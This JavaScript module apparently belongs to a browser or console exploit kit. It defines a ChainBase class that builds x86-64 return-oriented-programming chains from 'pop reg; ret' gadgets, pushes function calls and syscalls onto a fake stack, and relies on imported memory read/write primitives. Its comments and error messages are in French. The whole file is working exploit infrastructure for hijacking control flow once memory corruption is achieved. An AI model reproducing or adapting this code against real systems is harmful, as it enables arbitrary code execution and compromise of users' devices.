import { Int } from './int64.mjs';
import { get_view_vector } from './memtools.mjs';
import { read64, write64 } from './rw.mjs';

const argument_pops = [
    'pop rdi; ret',
    'pop rsi; ret',
    'pop rdx; ret',
    'pop rcx; ret',
    'pop r8; ret',
    'pop r9; ret',
];

export class ChainBase {
    constructor() {
        this.is_stale = false;
        this.position = 0;
        this._return_value = new Uint8Array(8);
        this.retval_addr = get_view_vector(this._return_value);

        const stack_buffer = new ArrayBuffer(0x20000);
        this.stack = new Uint8Array(stack_buffer, 0x10000);
        this.stack_addr = get_view_vector(this.stack);
    }

    push_value(value) {
        if (this.position >= this.stack.byteLength) {
            throw Error('Pile ROP pleine.');
        }
        write64(this.stack, this.position, new Int(value));
        this.position += 8;
    }

    push_gadget(insn_str) {
        this.push_value(this.get_gadget(insn_str));
    }

    push_call(func_addr, ...args) {
        args.forEach((arg, i) => {
            this.push_gadget(argument_pops[i]);
            this.push_value(arg);
        });
        this.push_gadget('ret');  // Alignement de la pile
        this.push_value(func_addr);
    }

    push_syscall(syscall_name, ...args) {
        const sysno = syscall_map.get(syscall_name);
        if (sysno === undefined) throw Error(`Syscall non trouvé : ${syscall_name}`);
        this.push_call(this.syscall_array[sysno], ...args);
    }

    static init_class(gadgets, syscall_array = []) {
        argument_pops.forEach(insn => {
            if (!gadgets.has(insn)) throw Error(`Gadget manquant : ${insn}`);
        });
        this.prototype.gadgets = gadgets;
        this.prototype.syscall_array = syscall_array;
    }
}
